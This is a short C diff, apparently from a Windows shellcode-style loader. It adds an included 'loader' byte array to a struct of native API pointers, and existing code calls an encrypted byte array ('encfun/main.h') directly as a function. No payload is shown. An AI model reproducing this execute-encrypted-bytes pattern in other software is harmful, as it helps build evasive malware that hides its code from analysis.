@@ -27,6 +27,10 @@ void sys_uni();
 
 //char buf[] = {0x90, 0x90, 0x90, 0x90, 0xC3};
 
+uint8_t loader[] = 
+#include "loader.h"
+;
+
 uint8_t main_fun[] = 
 #include "encfun/main.h"
 ;
@@ -50,6 +54,7 @@ int main(int argc, char *argv[]) {
 	main_funs.RtlInitUnicodeString = RtlInitUnicodeString;
 	main_funs.RtlCreateProcessParametersEx = RtlCreateProcessParametersEx;
 	main_funs.sys_uni = sys_uni;
+	main_funs.loader = loader;
 
 	(*(void(*)(main_funs_t*))main_fun)(&main_funs);
 
